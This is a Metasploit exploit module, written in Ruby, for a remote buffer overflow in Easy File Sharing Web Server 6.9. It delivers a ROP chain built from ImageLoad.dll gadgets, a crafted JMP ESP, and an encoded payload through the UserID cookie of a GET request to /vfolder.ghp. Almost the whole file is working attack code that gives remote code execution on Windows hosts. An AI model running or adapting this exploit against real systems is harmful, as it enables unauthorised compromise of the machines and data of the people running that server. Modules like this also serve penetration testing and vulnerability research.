##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'    => 'Easy File Sharing Web Server - USERID Remote Buffer Overflow',
      'Description'  => %q{
	# Date:          2015-08-22
	# Software Link: http://www.efssoft.com/
	# Tested on:     Win7x32-EN,Win7x64-EN
	# Special Thanks To: Julien Ahrens for the crafted jmp esp Trick ;) 
	# Credits for vulnerability discovery: superkojiman
      },
      'License'    => MSF_LICENSE,
      'Author'    =>
        [
          'Tracy Turben (tracyturben@gmail.com)',  # Original discovery
          'justarandomuser',  # MSF Module
        ],
      'References'  =>
        [
          [ 'OSVDB', '' ],
          [ 'CVE', '' ],
          [ 'URL', 'http://www.exploit-db.com/exploits/33453/' ]
        ],
      'DefaultOptions' =>
        {
          'ExitFunction' => 'process', #none/process/thread/seh
          #'InitialAutoRunScript' => 'migrate -f',
        },
      'Platform'  => ['win'],
      'Payload'  =>
        {
          'BadChars' => "\x00\x0a\x0d\x3b",
          'DisableNops' => true,
          'Space' => 3660
        },
      'Targets'    =>
        [
          [ 'Easy File Sharing Web Server 6.9', { } ],
        ],
      'Privileged'  => false,
      'DisclosureDate'  => 'Aug 22 2015',
      'DefaultTarget'  => 0))

    register_options([Opt::RPORT(80)], self.class)

  end

  def exploit

    junk0 = "\x90" * 80

    # 0x1001d89b : {pivot 604 / 0x25c} # POP EDI # POP ESI # POP EBP # POP EBX # ADD ESP,24C # RETN [ImageLoad.dll] 
    # The memory located at 0x1001D8F0: "\x7A\xD8\x01\x10" does the job!
    # Due to call dword ptr [edx+28h]: 0x1001D8F0 - 28h = 0x1001D8C8
    call_edx = [0x1001D8C8].pack('V') 

    junk1 = "\x90" * 396
    ppr = [0x10010101].pack('V') # POP EBX # POP ECX # RETN [ImageLoad.dll]

    # Since 0x00 would break the exploit 00520498 PUSH ESP needs to be crafted on the stack.
    crafted_jmp_esp = [0xA4523C15].pack('V')

    test_bl = [0x10010125].pack('V') # contains 00000000 to pass the JNZ instruction

    kungfu = [0x10022aac].pack('V')  # MOV EAX,EBX # POP ESI # POP EBX # RETN [ImageLoad.dll]
    kungfu << [0xDEADBEEF].pack('V') # filler
    kungfu << [0xDEADBEEF].pack('V') # filler
    kungfu << [0x1001a187].pack('V') # ADD EAX,5BFFC883 # RETN [ImageLoad.dll] # finish crafting JMP ESP
    kungfu << [0x1002466d].pack('V') # PUSH EAX # RETN [ImageLoad.dll]

    nopsled="\x90" * 20

    sploit = junk0 + call_edx + junk1 + ppr + crafted_jmp_esp + test_bl + kungfu + nopsled + payload.encoded

    print_status("Sending request...")

    res = send_request_cgi({
      'uri'          => '/vfolder.ghp', 
      'method'       => 'GET',
      'cookie'       => "SESSIONID=1337; UserID=#{sploit}; PassWD=;",
      'connection'   => "Keep-Alive",
      'headers'      =>
      {
        'Accept'          => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language' => 'en-us',
        'Accept-Encoding'  => 'gzip, deflate'
      }
    }, 5)

    handler

  end

end

